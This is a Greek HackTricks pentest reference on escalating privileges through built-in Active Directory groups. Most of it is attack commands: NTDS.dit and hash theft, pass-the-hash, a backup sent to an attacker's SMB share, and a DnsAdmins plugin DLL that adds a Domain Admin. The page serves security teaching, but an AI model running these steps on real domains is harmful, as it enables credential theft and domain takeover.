# Προνομιούχες ομάδες

{{#include ../../banners/hacktricks-training.md}}

## Γνωστές ομάδες με δικαιώματα διαχείρισης

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Αυτή η ομάδα έχει τη δυνατότητα να δημιουργεί λογαριασμούς και ομάδες που δεν είναι administrators στο domain. Επιπλέον, επιτρέπει την τοπική σύνδεση στο Domain Controller (DC).

Για τον εντοπισμό των μελών αυτής της ομάδας, εκτελείται η ακόλουθη εντολή:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Επιτρέπεται η προσθήκη νέων χρηστών, καθώς και η τοπική σύνδεση στο DC.<sup>[[1]](#references)</sup>

## AdminSDHolder group

Το Access Control List (ACL) του **AdminSDHolder** group είναι κρίσιμο, καθώς ορίζει τα permissions για όλα τα "protected groups" στο Active Directory, συμπεριλαμβανομένων των high-privilege groups. Αυτός ο μηχανισμός διασφαλίζει την ασφάλεια αυτών των groups, αποτρέποντας μη εξουσιοδοτημένες τροποποιήσεις.

Ένας attacker θα μπορούσε να το εκμεταλλευτεί αυτό τροποποιώντας το ACL του **AdminSDHolder** group και παραχωρώντας full permissions σε έναν standard user. Αυτό θα έδινε ουσιαστικά σε αυτόν τον user πλήρη έλεγχο σε όλα τα protected groups. Αν τα permissions αυτού του user τροποποιούνταν ή αφαιρούνταν, θα επαναφέρονταν αυτόματα μέσα σε μία ώρα, λόγω του σχεδιασμού του συστήματος.<sup>[[14]](#references)</sup>

Η πρόσφατη τεκμηρίωση του Windows Server εξακολουθεί να αντιμετωπίζει αρκετά ενσωματωμένα operator groups ως **protected** objects (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, κ.λπ.). Η διαδικασία **SDProp** εκτελείται στον **PDC Emulator** κάθε 60 λεπτά από προεπιλογή, ορίζει `adminCount=1` και απενεργοποιεί το inheritance στα protected objects. Αυτό είναι χρήσιμο τόσο για persistence όσο και για τον εντοπισμό stale privileged users που αφαιρέθηκαν από ένα protected group, αλλά εξακολουθούν να διατηρούν το ACL χωρίς inheritance.<sup>[[12]](#references)</sup>

Οι εντολές για την εξέταση των μελών και την τροποποίηση των permissions περιλαμβάνουν:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Διατίθεται ένα script για την επιτάχυνση της διαδικασίας αποκατάστασης: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Για περισσότερες λεπτομέρειες, επισκεφθείτε το [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## Κάδος Ανακύκλωσης AD

Η συμμετοχή σε αυτή την ομάδα επιτρέπει την ανάγνωση διαγραμμένων αντικειμένων του Active Directory, τα οποία μπορεί να αποκαλύψουν ευαίσθητες πληροφορίες:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Αυτό είναι χρήσιμο για την **ανάκτηση προηγούμενων διαδρομών προνομίων**. Τα διαγραμμένα αντικείμενα μπορούν ακόμη να αποκαλύψουν τα `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, παλιά SPNs ή το DN μιας διαγραμμένης προνομιούχας ομάδας, η οποία μπορεί αργότερα να αποκατασταθεί από άλλον operator.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Πρόσβαση σε Domain Controller

Η πρόσβαση σε αρχεία στο DC είναι περιορισμένη, εκτός εάν ο χρήστης ανήκει στην ομάδα `Server Operators`, γεγονός που αλλάζει το επίπεδο πρόσβασης.

### Privilege Escalation

Χρησιμοποιώντας τα `PsService` ή `sc` από το Sysinternals, μπορεί κανείς να επιθεωρήσει και να τροποποιήσει τα δικαιώματα υπηρεσιών. Η ομάδα `Server Operators`, για παράδειγμα, έχει πλήρη έλεγχο σε ορισμένες υπηρεσίες, επιτρέποντας την εκτέλεση αυθαίρετων εντολών και το privilege escalation:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Αυτή η εντολή αποκαλύπτει ότι οι `Server Operators` έχουν πλήρη πρόσβαση, επιτρέποντας τον χειρισμό υπηρεσιών για την απόκτηση αυξημένων δικαιωμάτων.

## Backup Operators

Η συμμετοχή στην ομάδα `Backup Operators` παρέχει πρόσβαση στο σύστημα αρχείων του `DC01` λόγω των δικαιωμάτων `SeBackup` και `SeRestore`. Αυτά τα δικαιώματα επιτρέπουν τη διάσχιση φακέλων, την καταχώριση και την αντιγραφή αρχείων, ακόμη και χωρίς ρητά δικαιώματα, με τη χρήση της σημαίας `FILE_FLAG_BACKUP_SEMANTICS`. Για αυτήν τη διαδικασία απαιτείται η χρήση συγκεκριμένων scripts.<sup>[[1]](#references)</sup>

Για να παραθέσετε τα μέλη της ομάδας, εκτελέστε:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Local Attack

Για την αξιοποίηση αυτών των δικαιωμάτων τοπικά, εφαρμόζονται τα ακόλουθα βήματα:

1. Εισαγωγή των απαραίτητων βιβλιοθηκών:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Ενεργοποιήστε και επαληθεύστε το `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Πρόσβαση και αντιγραφή αρχείων από περιορισμένους καταλόγους, για παράδειγμα:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Η άμεση πρόσβαση στο file system του Domain Controller επιτρέπει την κλοπή της βάσης δεδομένων `NTDS.dit`, η οποία περιέχει όλα τα NTLM hashes για τους χρήστες και τους υπολογιστές του domain.

#### Χρήση του diskshadow.exe

1. Δημιουργήστε ένα shadow copy της μονάδας `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Αντιγράψτε το `NTDS.dit` από το shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Εναλλακτικά, χρησιμοποιήστε το `robocopy` για την αντιγραφή αρχείων:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Εξαγωγή των `SYSTEM` και `SAM` για ανάκτηση hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Ανάκτηση όλων των hashes από το `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Μετά την εξαγωγή: Pass-the-Hash προς DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Χρήση του wbadmin.exe

1. Ρυθμίστε το NTFS filesystem για τον SMB server στο attacker machine και αποθηκεύστε τα SMB credentials στο target machine.
2. Χρησιμοποιήστε το `wbadmin.exe` για system backup και εξαγωγή του `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Για μια πρακτική επίδειξη, δείτε το [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Τα μέλη του group **DnsAdmins** μπορούν να εκμεταλλευτούν τα privileges τους για να φορτώσουν ένα arbitrary DLL με δικαιώματα SYSTEM σε έναν DNS server, ο οποίος συχνά φιλοξενείται σε Domain Controllers. Αυτή η δυνατότητα επιτρέπει σημαντικές δυνατότητες exploitation.

Για να εμφανίσετε τα μέλη του group DnsAdmins, χρησιμοποιήστε:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Εκτέλεση αυθαίρετου DLL (CVE‑2021‑40469)

> [!NOTE]
> Αυτή η ευπάθεια επιτρέπει την εκτέλεση αυθαίρετου κώδικα με δικαιώματα SYSTEM στην υπηρεσία DNS (συνήθως μέσα στα DCs). Αυτό το ζήτημα διορθώθηκε το 2021.

Τα μέλη μπορούν να κάνουν τον DNS server να φορτώσει ένα αυθαίρετο DLL (είτε τοπικά είτε από ένα remote share) χρησιμοποιώντας εντολές όπως:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Η επανεκκίνηση της υπηρεσίας DNS (η οποία ενδέχεται να απαιτεί πρόσθετα δικαιώματα) είναι απαραίτητη για τη φόρτωση του DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Για περισσότερες λεπτομέρειες σχετικά με αυτό το attack vector, ανατρέξτε στο ired.team.

#### Mimilib.dll

Είναι επίσης εφικτό να χρησιμοποιηθεί το mimilib.dll για command execution, τροποποιώντας το ώστε να εκτελεί συγκεκριμένες εντολές ή reverse shells. [Ελέγξτε αυτήν την ανάρτηση](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) για περισσότερες πληροφορίες.<sup>[[15]](#references)</sup>

### Εγγραφή WPAD για MitM

Οι DnsAdmins μπορούν να χειραγωγήσουν εγγραφές DNS για να πραγματοποιήσουν επιθέσεις Man-in-the-Middle (MitM), δημιουργώντας μια εγγραφή WPAD αφού απενεργοποιήσουν τη global query block list. Εργαλεία όπως τα Responder ή Inveigh μπορούν να χρησιμοποιηθούν για spoofing και capturing network traffic.

### Event Log Readers
Τα μέλη μπορούν να έχουν πρόσβαση στα event logs, εντοπίζοντας ενδεχομένως ευαίσθητες πληροφορίες, όπως plaintext κωδικούς πρόσβασης ή λεπτομέρειες command execution:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

Αυτή η ομάδα μπορεί να τροποποιήσει τα DACLs στο αντικείμενο του domain, παρέχοντας ενδεχομένως προνόμια DCSync. Οι τεχνικές για privilege escalation μέσω εκμετάλλευσης αυτής της ομάδας περιγράφονται λεπτομερώς στο GitHub repo Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Εάν μπορείτε να ενεργήσετε ως μέλος αυτής της ομάδας, η κλασική κατάχρηση είναι να εκχωρήσετε σε ένα principal υπό τον έλεγχο του επιτιθέμενου τα δικαιώματα αναπαραγωγής που απαιτούνται για το [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Ιστορικά, το **PrivExchange** συνδύαζε πρόσβαση σε mailbox, εξαναγκασμό Exchange authentication και LDAP relay για να καταλήξει σε αυτό το ίδιο primitive. Ακόμη και όταν αυτή η relay διαδρομή έχει μετριαστεί, η άμεση συμμετοχή στο `Exchange Windows Permissions` ή ο έλεγχος ενός Exchange server παραμένει μια διαδρομή υψηλής αξίας προς δικαιώματα domain replication.

## Hyper-V Administrators

Οι Hyper-V Administrators έχουν πλήρη πρόσβαση στο Hyper-V, η οποία μπορεί να αξιοποιηθεί για την απόκτηση ελέγχου σε virtualized Domain Controllers. Αυτό περιλαμβάνει την κλωνοποίηση live DCs και την εξαγωγή NTLM hashes από το αρχείο NTDS.dit.

### Exploitation Example

Η πρακτική κατάχρηση είναι συνήθως **offline πρόσβαση σε DC disks/checkpoints** αντί για παλιά host-level LPE tricks. Με πρόσβαση στο Hyper-V host, ένας operator μπορεί να δημιουργήσει checkpoint ή να εξαγάγει έναν virtualized Domain Controller, να κάνει mount το VHDX και να εξαγάγει τα `NTDS.dit`, `SYSTEM` και άλλα secrets χωρίς να αγγίξει το LSASS μέσα στο guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Από εκεί, επαναχρησιμοποιήστε το workflow των `Backup Operators` για να αντιγράψετε το `Windows\NTDS\ntds.dit` και τα registry hives offline.

## Group Policy Creators Owners

Αυτή η ομάδα επιτρέπει στα μέλη της να δημιουργούν Group Policies στο domain. Ωστόσο, τα μέλη της δεν μπορούν να εφαρμόζουν group policies σε users ή groups ούτε να επεξεργάζονται υπάρχοντα GPOs.

Η σημαντική λεπτομέρεια είναι ότι ο **creator γίνεται owner του νέου GPO** και συνήθως αποκτά αρκετά δικαιώματα ώστε να το επεξεργαστεί στη συνέχεια. Αυτό σημαίνει ότι αυτή η ομάδα είναι ενδιαφέρουσα όταν μπορείτε είτε να:

- δημιουργήσετε ένα malicious GPO και να πείσετε έναν admin να το συνδέσει με ένα target OU/domain
- επεξεργαστείτε ένα GPO που δημιουργήσατε και είναι ήδη συνδεδεμένο κάπου χρήσιμα
- κάνετε abuse ενός άλλου delegated right που σας επιτρέπει να συνδέετε GPOs, ενώ αυτή η ομάδα σας παρέχει τη δυνατότητα επεξεργασίας

Το πρακτικό abuse συνήθως περιλαμβάνει την προσθήκη ενός **Immediate Task**, **startup script**, **local admin membership** ή αλλαγής **user rights assignment** μέσω policy files που υποστηρίζονται από το SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Εάν επεξεργάζεστε χειροκίνητα το GPO μέσω του `SYSVOL`, θυμηθείτε ότι η αλλαγή από μόνη της δεν αρκεί: πρέπει επίσης να ενημερωθούν τα `versionNumber`, `GPT.ini` και, σε ορισμένες περιπτώσεις, το `gPCMachineExtensionNames`, διαφορετικά οι clients θα αγνοήσουν το policy refresh.<sup>[[9]](#references)</sup>

## Organization Management

Σε περιβάλλοντα όπου έχει αναπτυχθεί το **Microsoft Exchange**, μια ειδική ομάδα γνωστή ως **Organization Management** διαθέτει σημαντικές δυνατότητες. Αυτή η ομάδα έχει δικαιώματα για **πρόσβαση στα mailboxes όλων των domain users** και διατηρεί **πλήρη έλεγχο του** Organizational Unit (OU) **`Microsoft Exchange Security Groups`**. Αυτός ο έλεγχος περιλαμβάνει την ομάδα **`Exchange Windows Permissions`**, η οποία μπορεί να αξιοποιηθεί για privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Τα μέλη της ομάδας **Print Operators** διαθέτουν αρκετά privileges, συμπεριλαμβανομένου του **`SeLoadDriverPrivilege`**, το οποίο τους επιτρέπει να κάνουν **log on locally σε Domain Controller**, να τον τερματίζουν και να διαχειρίζονται printers. Για την εκμετάλλευση αυτών των privileges, ειδικά αν το **`SeLoadDriverPrivilege`** δεν εμφανίζεται σε unelevated context, απαιτείται παράκαμψη του User Account Control (UAC).<sup>[[1]](#references)</sup>

Για την εμφάνιση των μελών αυτής της ομάδας χρησιμοποιείται η ακόλουθη εντολή PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Σε Domain Controllers αυτή η ομάδα είναι επικίνδυνη, επειδή η προεπιλεγμένη Domain Controller Policy εκχωρεί το **`SeLoadDriverPrivilege`** στην `Print Operators`. Αν αποκτήσετε ένα elevated token για ένα μέλος αυτής της ομάδας, μπορείτε να ενεργοποιήσετε το privilege και να φορτώσετε έναν signed-but-vulnerable driver για να μεταβείτε σε kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Για λεπτομέρειες σχετικά με τον χειρισμό token, δείτε το [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Τα μέλη αυτής της ομάδας αποκτούν πρόσβαση σε PCs μέσω του Remote Desktop Protocol (RDP). Για την απαρίθμηση αυτών των μελών, είναι διαθέσιμες εντολές PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Περισσότερες πληροφορίες σχετικά με την εκμετάλλευση του RDP μπορούν να βρεθούν σε εξειδικευμένους πόρους pentesting.

#### Users απομακρυσμένης διαχείρισης

Τα μέλη μπορούν να αποκτήσουν πρόσβαση σε PCs μέσω του **Windows Remote Management (WinRM)**. Η απαρίθμηση αυτών των μελών επιτυγχάνεται μέσω:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Για τεχνικές exploitation που σχετίζονται με το **WinRM**, πρέπει να συμβουλευτείτε τη σχετική documentation.

#### Server Operators

Αυτή η ομάδα διαθέτει δικαιώματα για την εκτέλεση διαφόρων ρυθμίσεων σε Domain Controllers, συμπεριλαμβανομένων των δικαιωμάτων backup και restore, της αλλαγής της ώρας του συστήματος και του τερματισμού λειτουργίας του συστήματος.<sup>[[1]](#references)</sup> Για την απαρίθμηση των μελών, χρησιμοποιείται η ακόλουθη εντολή:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Στα Domain Controllers, οι `Server Operators` συνήθως κληρονομούν αρκετά δικαιώματα για **αναδιαμόρφωση ή εκκίνηση/διακοπή υπηρεσιών** και επίσης λαμβάνουν τα `SeBackupPrivilege`/`SeRestorePrivilege` μέσω της προεπιλεγμένης πολιτικής DC. Στην πράξη, αυτό τους καθιστά γέφυρα μεταξύ της **κατάχρησης ελέγχου υπηρεσιών** και του **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Εάν ένα service ACL παρέχει σε αυτή την ομάδα δικαιώματα αλλαγής/εκκίνησης, δείξτε το service σε μια αυθαίρετη εντολή, εκκινήστε το ως `LocalSystem` και, στη συνέχεια, επαναφέρετε το αρχικό `binPath`. Εάν ο έλεγχος των services είναι κλειδωμένος, χρησιμοποιήστε εναλλακτικά τις παραπάνω τεχνικές των `Backup Operators` για να αντιγράψετε το `NTDS.dit`.

## References

- [1] [ired.team – Privileged Accounts και Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Κατάχρηση του SeLoadDriverPrivilege για Privilege Escalation](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Κατάχρηση δικαιωμάτων GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Κατάχρηση GPO, Μέρος 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Οδηγός του Red Teamer για GPOs και OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Συνάρτηση ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Παράρτημα C: Protected Accounts και Groups στο Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Πώς να κάνετε Abuse και Backdoor το AdminSDHolder για να αποκτήσετε Persistence ως Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Κατάχρηση του DnsAdmins Privilege για Escalation στο Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Πληροφορίες για Abuse του GenericAll edge](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Συνάρτηση NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
